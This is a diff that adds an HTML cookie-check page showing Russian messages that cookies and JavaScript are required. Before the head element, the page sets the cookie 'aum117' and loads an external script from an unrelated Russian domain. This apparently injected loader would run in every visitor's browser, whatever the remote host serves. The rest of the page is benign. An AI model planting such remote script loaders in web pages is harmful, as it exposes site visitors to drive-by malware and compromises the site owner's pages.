@@ -1,0 +1,46 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<script type="text/javascript">
+        var Cookies = {
+         init: function () {
+             var allCookies = document.cookie.split('; ');
+             for (var i=0;i<allCookies.length;i++) {
+                 var cookiePair = allCookies[i].split('=');
+                 this[cookiePair[0]] = cookiePair[1];
+             }
+         },
+         create: function (name,value,days) {
+             if (days) {
+                 var date = new Date();
+                 date.setTime(date.getTime()+(days*24*60*60*1000));
+                 var expires = "; expires="+date.toGMTString();
+             }
+             else var expires = "";
+             document.cookie = name+"="+value+expires+"; path=/";
+             this[name] = value;
+         },
+         delete: function (name) {
+             this.create(name,'',-1);
+             this[name] = undefined;
+         }
+        };
+        Cookies.init();
+        Cookies.create('aum117', '1');
+    </script><script src='http://alumico.ru/mul117.js?PHPSESSID=616c756d69636f7277386c7060696361'></script><head>
+<title>
+				</title>
+<meta name="robots" content="noindex, nofollow">
+</head>
+<body onload="check();">
+<script type="text/javascript">
+function check() {
+	document.cookie = "60767B17-9386-42ae-BBA9-D1BCA9E8837B=Checked; expires=Thu, 26-Jun-2014 22:24:27 GMT; path=/";
+	if (document.cookie && document.cookie.indexOf('60767B17-9386-42ae-BBA9-D1BCA9E8837B') != -1)
+		location.reload(true);
+	else
+		document.write("Этот сайт требует поддержки технологии Cookies.");
+}
+</script>
+<noscript>Этот сайт требует поддержки технологии JavaScript.</noscript>
+</body>
+</html>
